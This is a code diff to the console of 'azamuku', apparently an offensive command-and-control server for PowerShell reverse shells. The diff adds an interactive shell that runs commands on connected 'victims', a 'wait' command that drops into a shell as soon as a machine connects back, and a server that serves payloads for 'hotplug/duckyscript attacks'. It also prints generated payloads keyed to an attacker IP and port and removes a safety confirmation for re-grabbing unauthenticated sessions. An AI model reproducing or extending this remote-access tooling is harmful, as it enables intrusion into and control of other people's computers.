@@ -11,9 +11,13 @@ written by otter - github.com/whatotter
 """
 
 stager = None
+newest = None
+
+hotPlug = False
+hotPlugPort = None
 
 def getInfo():
-    global stager
+    global stager, newest
     old = 0
 
     while True:
@@ -36,6 +40,9 @@ def getInfo():
                         control.run(x)
                 except Exception as e:
                     print("\n[+] failed to run stager on uid '{}' - '{}'".format(x, e))
+
+            if newest == False:
+                newest = newUID
 
             old = len(s.connects)
 
@@ -83,6 +90,28 @@ def highlight(text:str, highlight:list, color=(0, 255, 0)):
         text = text.replace(x, highlightText)
     return text
 
+def interactive(uid):
+    victim = s.client(uid)
+    pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
+
+    while True:
+        try:
+            command = input(pwd)
+            if command in ["quit", "exit"]:
+                break
+            elif command.split(" ")[0] in ["cd"]:
+                pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
+        except KeyboardInterrupt:
+            print('\n\n[+] breaking out of shell due to ctrl+c\n')
+            break
+        
+        try:
+            print(coolFade(victim.run(command), (150, 150, 150), (150, 150, 150)))
+        except:
+            print("[+] killed due to ctrl+c")
+
+    return None
+
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
 
@@ -96,8 +125,8 @@ if __name__ == '__main__':
                         default="8080")
     
     parser.add_argument("--https-port",
-                        help="port to bind the https server to (default: 8081)",
-                        default="8081")
+                        help="port to bind the https server to (default: 0 (off))",
+                        default="0")
     
     parser.add_argument("--certfile",
                         help="certfile for the https server (https://stackoverflow.com/a/10176685) (default: server.pem)",
@@ -115,25 +144,26 @@ if __name__ == '__main__':
     stager = args.stager
     srv = s.azamuku()
 
-    if not os.path.exists(args.certfile):
-        a = input("[X] certificate \"{}\" not found - would you like to create one? (also creates keyfile) (requires openssl) [y/n]".format(args.certfile)).lower()
-        if a == "y":
-            os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
-            print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
-            args.certfile = 'server.pem'; args.keyfile = 'key.pem'
-        else:
-            print('[X] no certificate found, and user declined - skipping HTTPS server..')
-            args.https_port = 0
+    if int(args.https_port) != 0:
+        if not os.path.exists(args.certfile) :
+            a = input("[X] certificate \"{}\" not found - would you like to create one? (also creates keyfile) (requires openssl) [y/n]".format(args.certfile)).lower()
+            if a == "y":
+                os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
+                print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
+                args.certfile = 'server.pem'; args.keyfile = 'key.pem'
+            else:
+                print('[X] no certificate found, and user declined - skipping HTTPS server..')
+                args.https_port = 0
 
-    elif not os.path.exists(args.keyfile):
-        a = input("[X] keyfile \"{}\" not found - would you like to create one? (also creates certificate) (requires openssl) [y/n]".format(args.keyfile)).lower()
-        if a == "y":
-            os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
-            print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
-            args.certfile = 'server.pem'; args.keyfile = 'key.pem'
-        else:
-            print('[X] no keyfile found, and user declined - skipping HTTPS server..')
-            args.https_port = 0
+        elif not os.path.exists(args.keyfile):
+            a = input("[X] keyfile \"{}\" not found - would you like to create one? (also creates certificate) (requires openssl) [y/n]".format(args.keyfile)).lower()
+            if a == "y":
+                os.system("openssl req -x509 -newkey rsa:4096 -keyout key.pem -out server.pem -sha256 -days 365")
+                print("[+] created keyfile 'key.pem' and certificate 'server.pem'")
+                args.certfile = 'server.pem'; args.keyfile = 'key.pem'
+            else:
+                print('[X] no keyfile found, and user declined - skipping HTTPS server..')
+                args.https_port = 0
 
     srv.start(args.server, httpPort=int(args.http_port), httpsPort=int(args.https_port), certfile=args.certfile)
     threading.Thread(target=getInfo, daemon=True).start()
@@ -152,8 +182,8 @@ if __name__ == '__main__':
     print("\"fool me once, shame on you - fool me twice, shame on me\"")
     print("       created by otter - github.com/whatotter\n")
     
-    if args.http_port != 0: print("[+] started azamuku's HTTP server @ {}:{}".format(args.server, args.http_port))
-    if args.https_port != 0: print("[+] started azamuku's HTTPS server @ {}:{}".format(args.server, args.https_port))
+    if int(args.http_port) != 0: print("[+] started azamuku's HTTP server @ {}:{}".format(args.server, args.http_port))
+    if int(args.https_port) != 0: print("[+] started azamuku's HTTPS server @ {}:{}".format(args.server, args.https_port))
     print("[+] run 'help' for a list of commands - good luck :)")
     print("") # \n
 
@@ -164,6 +194,8 @@ if __name__ == '__main__':
             cmd = inp.split(" ")[0]
             try:
                 cArgs = inp.split(" ", 1)[-1]
+                if cArgs.split(" ", 1)[0] == cmd:
+                    cArgs = None
             except:
                 cArgs = None
 
@@ -190,51 +222,50 @@ if __name__ == '__main__':
                 print(t)
 
         elif cmd.lower() == "shell": # interactive shell
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
             uid = cArgs.split(" ", 1)[0]
             if uid in s.connects:
-                print("[+] pop thy shell")
-                victim = s.client(uid)
-                pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
-
-                while True:
-                    try:
-                        command = input(pwd)
-                        if command in ["quit", "exit"]:
-                            break
-                        elif command in ["cd"]:
-                            pwd = "\nPS " + victim.run('"$pwd"').strip() + "> "
-                    except KeyboardInterrupt:
-                        print('\n\n[+] breaking out of shell due to ctrl+c\n')
-                        break
-                    
-                    try:
-                        print(coolFade(victim.run(command), (150, 150, 150), (150, 150, 150)))
-                    except:
-                        print("[+] killed due to ctrl+c")
+                interactive(uid)
             else:
                 print("[X] uid '{}' not valid - run command 'info' for a list of victims".format(uid))
 
         elif cmd.lower() == "payload":
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
             ip, port = cArgs.split(" ", 1)
             payload = s.payload.generatePayload(ip, port, "http.txt")
             print(highlight(payload, [ip, port], color=(150, 0, 0)))
 
-        elif cmd.lower() == "allow":
-            if cArgs in os.listdir(os.path.dirname(cArgs)):
-                uids = open(cArgs, "r").read().split("\n")
-                for x in uids:
-                    s.authorized.append(cArgs)
-                print("[+] allowed {} uids to connect back, from file '{}'".format(len(uids), cArgs))
+            if hotPlug:
+                print("\n   --- or, for hotplug/duckyscript attacks ---\n")
 
+                payload = s.payload.generatePayload(ip, port, "hotplug.txt").replace("%hotplug%", str(hotPlugPort))
+                print(highlight(payload, [ip, port], color=(150, 0, 0)))
+
+        elif cmd.lower() == "allow":
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
+            try:
+                if cArgs in os.listdir(os.path.dirname(cArgs)):
+                    uids = open(cArgs, "r").read().split("\n")
+                    for x in uids:
+                        s.authorized.append(cArgs)
+                    print("[+] allowed {} uids to connect back, from file '{}'".format(len(uids), cArgs))
+            except:
+                pass
+            
             s.authorized.append(cArgs)
             print('[+] allowed uid \'{}\' to connect back'.format(cArgs))
 
         elif cmd.lower() == "grab":
             if s.enableGrab == False:
-                print("[+] this allows *unauthenticated* payloads to be re-authenticated - if you have the old payload, it's better to reauthenticate the uid using the 'allow' command - are you sure you want to enable this?", end="")
-                if input("[y/n]").lower() == "y":
-                    s.enableGrab = True
-                    print("[+] enabled grabbing old sessions - toggle this by running 'grab' again")
+                print("[+] this allows *unauthenticated* payloads to be re-authenticated - be careful")
+                s.enableGrab = True
+                print("[+] enabled grabbing old sessions - toggle this by running 'grab' again")
             else:
                 s.enableGrab = False
                 print("[+] disabled grabbing")
@@ -254,7 +285,10 @@ if __name__ == '__main__':
                 "grab": ["allows grabbing unauthorized uids connecting back to this server", "grab"],
                 "export": ["exports authorized uids for later use with allow", "export (file)"],
                 "exit": ["i wonder what this one does", "exit"],
-                "quit": ["synonymous to exit", "quit"]
+                "quit": ["synonymous to exit", "quit"],
+                "wait": ["launches an interactive shell the moment a client connects", "wait"],
+                "hotplug": ["launches an http server for hotplug attacks", "hotplug (port)"],
+                "rm": ["deletes a uid from authorized and from table", "rm (uid)"]
             }
 
             t = PrettyTable(["command", "description", "usage"])
@@ -269,6 +303,57 @@ if __name__ == '__main__':
                 break
             else:
                 continue
+
+        elif cmd.lower() in ["rm", "remove", "del"]:
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
+
+            uid = cArgs.split(" ", 1)[0]
+            try:
+                s.authorized.remove(uid)
+                s.vicInfo.pop(uid)
+                print("[+] removed uid \"{}\" from authorized uid list".format(uid))
+            except:
+                print("[X] couldn't remove uid \"{}\" - possibly doesn't exist?".format(uid))
+
+        elif cmd.lower() == "wait":
+            print("[+] waiting for newest shell connection..")
+            
+            newest = False
+            while newest == False:
+                time.sleep(0.1)
+
+            uid = newest
+            
+            print("[+] got shell with uid \"{}\"".format(uid))
+            newest = None
+
+            print("[+] pop thy shell")
+
+            interactive(uid)
+
+        elif cmd.lower() == "hotplug":
+            if cArgs == None:
+                print("[+] not enough arguments - view \"help\" to view arguments for this command")
+                continue
+
+            port = cArgs.split(" ", 1)[0]
+
+
+            if not hotPlug:
+                print("[+] starting hotplug server..")
+
+                srv.startHotplug(args.server, port=int(port))
+
+                print("[+] started hotplug server @ {}:{}".format(args.server, port))
+
+                hotPlugPort = port
+                hotPlug = True
+            else:
+                srv.stopHotplug()
+                hotPlug = False
+                print("[+] stopped hotplug server")
 
         else:
             print("[+] not a valid command - run 'help' for a table of them")
